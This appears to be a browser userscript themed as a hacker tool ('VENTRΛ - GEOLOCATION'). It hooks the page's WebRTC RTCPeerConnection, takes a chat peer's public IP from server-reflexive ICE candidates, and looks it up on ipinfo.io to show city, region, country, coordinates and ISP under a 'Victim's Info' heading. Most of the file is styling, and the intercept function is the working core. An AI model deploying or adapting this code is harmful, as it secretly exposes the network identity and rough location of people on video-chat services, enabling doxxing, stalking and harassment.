// === GLOBAL UI CREATION ===
const style = document.createElement('style');
style.textContent = `
  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap'); /* Default font for simplicity */

  #Overlay {
    position: fixed;
    bottom: 20px;
    left: 875px;
    width: 320px;
    background: rgba(10, 10, 10, 0.75);
    border: 1px solid rgba(255, 255, 255, 0.08);
    box-shadow: 0 0 20px rgba(0, 0, 0, 0.8), inset 0 0 10px rgba(255, 255, 255, 0.05);
    border-radius: 10px;
    font-family: 'Share Tech Mono', monospace;
    color: white;
    padding: 20px;
    z-index: 9999;
    transition: all 0.5s ease;
    animation: fadeinDark 0.8s ease-in;
    backdrop-filter: blur(10px) saturate(180%);
  }

  #Overlay h2 {
    text-align: center;
    color: #ff2a2a;
    font-size: 1.4em;
    text-shadow: 0 0 5px #ff0000;
    animation: blinker 0.6s linear infinite;
  }

  #revealBtn {
    margin-top: 10px;
    background: #ff0000;
    border: none;
    color: white;
    font-weight: bold;
    padding: 10px;
    width: 100%;
    cursor: pointer;
    border-radius: 5px;
    box-shadow: 0 0 0px transparent;
    transition: transform 0.2s ease;
  }

  #revealBtn:active {
    transform: scale(0.96);
    box-shadow: 0 0 12px red;
  }

  @keyframes fadeinDark {
    from { opacity: 0; transform: scale(0.8); filter: brightness(0.5); }
    to { opacity: 1; transform: scale(1); filter: brightness(1); }
  }

  @keyframes blinker {
    50% { opacity: 0.5; }
  }

  #hackerWindow {
    position: fixed;
    top: 110px; /* Move it down by 100px from the top */
    left: 1000px; /* Move it 20px from the left */
    transform: translateX(0); /* Remove the centering */
    width: 420px;
    max-height: 380px;
    overflow: hidden;
    background: rgba(0, 0, 0, 0.7);
    border: 1px solid rgba(255, 50, 50, 0.2);
    box-shadow: 0 0 25px rgba(255, 0, 0, 0.3), inset 0 0 15px rgba(255, 50, 50, 0.15);
    color: #ff4444;
    font-family: 'Share Tech Mono', sans-serif;
    padding: 20px;
    border-radius: 15px;
    display: none;
    z-index: 10000;
    animation: terminalCoolFade 1s ease forwards;
    backdrop-filter: blur(14px) saturate(150%);
  }

  @keyframes terminalCoolFade {
    from {
      opacity: 0;
      transform: translateX(-50%) scale(0.8);
      filter: brightness(0.5) blur(2px);
    }
    to {
      opacity: 1;
      transform: translateX(-50%) scale(1);
      filter: brightness(1) blur(0px);
    }
  }

  .line {
    margin: 10px 0;
    font-size: 1em;
    display: flex;
    align-items: center;
    animation: infoFadeIn 0.4s ease forwards;
    opacity: 0;
  }

  .line:nth-child(1) { animation-delay: 0.3s; }
  .line:nth-child(2) { animation-delay: 0.5s; }
  .line:nth-child(3) { animation-delay: 0.7s; }
  .line:nth-child(4) { animation-delay: 0.9s; }
  .line:nth-child(5) { animation-delay: 1.1s; }
  .line:nth-child(6) { animation-delay: 1.3s; }

  @keyframes infoFadeIn {
    from {
      opacity: 0;
      transform: translateX(-20px);
    }
    to {
      opacity: 1;
      transform: translateX(0);
    }
  }

  .label {
    font-weight: bold;
    color: #ff4444;
    width: 100px;
    flex-shrink: 0;
    text-shadow: 0 0 2px #ff0000;
    font-family: 'Share Tech Mono', monospace;
  }

  .value {
    font-weight: bold;  /* Makes the text bold */
    color: #ffffff;     /* Keeps the text color white */
    font-family: 'Share Tech Mono', monospace; /* Same font as before */
  }

  #hackerWindow h3 {
    margin-bottom: 15px;
    text-align: center;
    color: #ff5555;
    font-size: 1.4em;
    text-shadow: 0 0 12px #ff0000;
    border-bottom: 1px solid rgba(255,50,50,0.3);
    padding-bottom: 10px;
    animation: blinker 1s infinite alternate;
  }
`;
document.head.appendChild(style);

// === UI HTML STRUCTURE ===
const Overlay = document.createElement('div');
Overlay.id = 'Overlay';
Overlay.innerHTML = `
  <h2>VENTRÎ› - GEOLOCATION</h2>
  <button id="revealBtn">Reveal IP</button>
`;

const hackerWindow = document.createElement('div');
hackerWindow.id = 'hackerWindow';
hackerWindow.innerHTML = `
  <h3>ðŸ‘½ Victim's Info</h3>
  <div id="terminalLines">
    <div class="line"><span class="label">IP:</span><span class="value">Awaiting...</span></div>
    <div class="line"><span class="label">City:</span><span class="value">N/A</span></div>
    <div class="line"><span class="label">Region:</span><span class="value">N/A</span></div>
    <div class="line"><span class="label">Country:</span><span class="value">N/A</span></div>
    <div class="line"><span class="label">Coords:</span><span class="value">N/A</span></div>
    <div class="line"><span class="label">ISP:</span><span class="value">N/A</span></div>
  </div>
`;
document.body.appendChild(Overlay);
document.body.appendChild(hackerWindow);

// === IP REVEAL BUTTON LOGIC ===
document.getElementById('revealBtn').addEventListener('click', () => {
  hackerWindow.style.display = 'block';
});

// === PEER CONNECTION INTERCEPT + DISPLAY ===
window.oRTCPeerConnection = window.oRTCPeerConnection || window.RTCPeerConnection;
window.RTCPeerConnection = function(...args) {
  const pc = new window.oRTCPeerConnection(...args);
  pc.oaddIceCandidate = pc.addIceCandidate;

  pc.addIceCandidate = function(iceCandidate, ...rest) {
    const fields = iceCandidate.candidate.split(' ');
    if (fields[7] === 'srflx') {
      const ip = fields[4];
      updateLine("IP", ip);
      const xhr = new XMLHttpRequest();
      xhr.onreadystatechange = function() {
        if (xhr.readyState === 4 && xhr.status === 200) {
          try {
            const data = JSON.parse(xhr.responseText);
            updateLine("City", data.city || "N/A");
            updateLine("Region", data.region || "N/A");
            updateLine("Country", data.country || "N/A");
            updateLine("Coords", data.loc || "N/A");
            updateLine("ISP", data.org || "N/A");
          } catch {
            console.warn("Invalid JSON returned");
          }
        }
      };
      xhr.open("GET", `https://ipinfo.io/${ip}/json`, true);
      xhr.send();
    }
    return pc.oaddIceCandidate(iceCandidate, ...rest);
  };
  return pc;
};

// === HELPER TO UPDATE TERMINAL INFO ===
function updateLine(label, value) {
  const lines = document.querySelectorAll('#terminalLines .line');
  lines.forEach(line => {
    const labelSpan = line.querySelector('.label');
    if (labelSpan.textContent.replace(":", "") === label) {
      const valueSpan = line.querySelector('.value');
      valueSpan.textContent = value;
      valueSpan.style.animation = 'blinker 0.7s ease-in-out 1';
    }
  });
}